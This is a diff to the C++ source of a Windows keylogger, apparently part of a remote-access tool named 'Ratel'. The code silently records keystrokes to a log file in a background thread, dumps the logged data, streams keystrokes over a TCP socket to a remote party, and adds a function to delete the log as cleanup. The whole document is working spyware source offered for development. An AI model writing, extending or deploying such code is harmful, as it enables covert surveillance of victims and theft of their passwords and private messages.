@@ -3,6 +3,7 @@
 #include "../inc/other.h"
 #include "../inc/ErrorCodes.h"
 
+
 Keylogger::Keylogger()
 {
     ;
@@ -30,16 +31,14 @@ VOID Keylogger::setPathLogFile()
 
     WCHAR buff[MAX_PATH]={0};
 
-    if(GetFullPathNameW(a_log_file, sizeof(a_log_file), buff, NULL) == 0)
+    wcout << "\n\n\n-1-1-1--1-----\nIn setPathLogFile: " << endl;
+    if(GetFullPathNameW(a_path_log_file.c_str(), MAX_PATH, buff, NULL) != 0)
     {
-        //if error;
-        a_path_log_file = a_log_file;
-    }
-    else
-    {
+        //if not error:
         a_path_log_file = buff;
     }
     wcout << "Final path: " << a_path_log_file << endl;
+    wcout << "getLasteroor setPathLogFile: " << GetLastError() <<"\n\n"<< endl;
 }
 
 
@@ -191,15 +190,24 @@ wstring Keylogger::intToUnicode(INT keystroke)
 }
 
 
-VOID Keylogger::directTcp()
+INT Keylogger::directTcp()
 {
+    INT error_codes = 0;
+
     HANDLE threads[1];
 
     wcout << "In directTcp " << endl;
 
     threads[0] = CreateThread(NULL,0 ,sendKeystrokeThread ,this ,0 ,NULL); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
     threads[1] = CreateThread(NULL,0 ,recvDataThread ,this ,0 ,NULL);
-    
+    if(threads[0] == NULL)
+    {
+        error_codes = RATEL_ERROR_THREAD_SENDKEY;
+    }
+    if(threads[1] == NULL)
+    {
+        error_codes = RATEL_ERROR_THREAD_RECVDATA;
+    }
     WaitForSingleObject(threads[1], INFINITE);
   
     wcout << "stat directSendKeystrokeRunning: " << directSendKeystrokeRunning << endl;
@@ -208,9 +216,7 @@ VOID Keylogger::directTcp()
     CloseHandle(threads[0]);
     CloseHandle(threads[1]);
 
-    threads[0] = NULL;
-    threads[1] = NULL;
-
+    return error_codes;
 }
 
 
@@ -264,11 +270,12 @@ VOID Keylogger::directSendKeystroke() //for directTcp
                         wcout << "\nerror in socket ...\n" << endl;
                         wcout << GetLastError() << endl;
                         directSendKeystrokeRunning = FALSE;
-                        CloseHandle(hFile);
+
                     } 
                 }
             }
         }
+        CloseHandle(hFile);
     
     }
     wcout << "stop while directSendKeystrokeRunning" << endl;
@@ -306,9 +313,7 @@ VOID Keylogger::directRecvData()//waits to receive an end-of-connection message 
     wcout << "stop thread baby !" << endl;
 }
 
-
 //-------------------------------------------------------------------------------------------------------------------
-
 
 INT Keylogger::silenciousStop()//return 1 if error
 {
@@ -347,7 +352,7 @@ INT Keylogger::silenciousStart()//return 1 if error
         wcout << "status_error_codes:" << status_error_codes << endl;
         if(status_error_codes == ERROR_ACCESS_DENIED)
         {
-            wcout << "error access denied baby !!" << endl;
+            wcout << "error access denied baby !!" << endl; //TO test
         }
         return 1; // Fatal error
     }
@@ -356,16 +361,34 @@ INT Keylogger::silenciousStart()//return 1 if error
         wcout << "file create insilenciousStart... ";
     }
 
-    HANDLE hThread  = CreateThread(NULL,0 ,silenciousThread ,this ,0 ,NULL);
-    //WaitForSingleObject(hThread, INFINITE); //just for test
+    setPathLogFile();
+
+    HANDLE hThread  = CreateThread(NULL, 0, silenciousThread ,this ,0 ,NULL);
     return 0;
 }
 
-
-INT Keylogger::silenciousDelete()
+INT Keylogger::silenciousClean()
 {
-
-   return 0;
+    if(a_path_log_file.empty())
+    {
+        return 1; //error
+    }
+    if(DeleteFileW(a_path_log_file.c_str()) == 0)
+    {
+        wcout << "error delete log file: " << GetLastError() << endl;
+        /*
+        if(GetLastError() == ERROR_SHARING_VIOLATION && silenciousBackgroundRunning)
+        {
+            return  101;//RATEL_ERROR_FILE_MANIPULATION;
+        }
+        */
+        return 1;//error
+    }
+    else
+    {
+        
+        return 0;
+    }
 }
 
 
@@ -419,8 +442,8 @@ HANDLE Keylogger::silenciousCreateFile(DWORD *ERROR_CODES) //return NULL if erro
     DWORD dwBytesWritten = 0; 
     DWORD dwDesiredAccess;
     DWORD dwCreationDisposition; 
-    
-    if(checkIfFileExist((wstring)a_log_file))
+    wcout << "silenciousCreateFile: " << endl; 
+    if(checkIfFileExist((wstring)a_path_log_file))
     {
         //if exist
         wcout << "[+] file exist.\n" << endl;
@@ -434,7 +457,7 @@ HANDLE Keylogger::silenciousCreateFile(DWORD *ERROR_CODES) //return NULL if erro
     }
 
 
-    hFile = CreateFileW(a_log_file,  (GENERIC_READ | FILE_APPEND_DATA) , (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
+    hFile = CreateFileW(a_path_log_file.c_str(),  (GENERIC_READ | FILE_APPEND_DATA) , (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
     wcout << "last error createfile: " << GetLastError() << endl;
     wcout << "CreateFile hFile: " << hFile << endl; 
     
@@ -448,7 +471,7 @@ HANDLE Keylogger::silenciousCreateFile(DWORD *ERROR_CODES) //return NULL if erro
     
     else
     {
-        if(ERROR_CODES != NULL){*ERROR_CODES = RATEL_ERROR_SUCCESS;}
+        if(ERROR_CODES != NULL){*ERROR_CODES = 0;}
         return hFile;
     }
 }
@@ -468,11 +491,11 @@ VOID Keylogger::silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST H
 
 vector <string> Keylogger::dumpAllData()
 {
-    wcout <<"\n\n\n" << endl;
+    wcout <<"\n\n\nsilenciousCreateFile:" << endl;
     //returns all the data from the keylogger write file.
     //If the Handle is not of efinite size then checkIfFileExist is called.
     
-    if(!checkIfFileExist(a_log_file))
+    if(!checkIfFileExist(a_path_log_file))
     //If checkIfFileExist fails then the silent functionCreateFileAndHideFile is called.
     {
        return vector<string>(); // retourn vector empty if error
@@ -489,8 +512,6 @@ vector <string> Keylogger::dumpAllData()
     vector <string> result;
     char chBuff[50]={0};
     DWORD dwRead;
-
-    wcout << GetLastError() << endl;
 
     while(TRUE) //Read buffer of anonymous pipe and append the result in result_of_command
     {
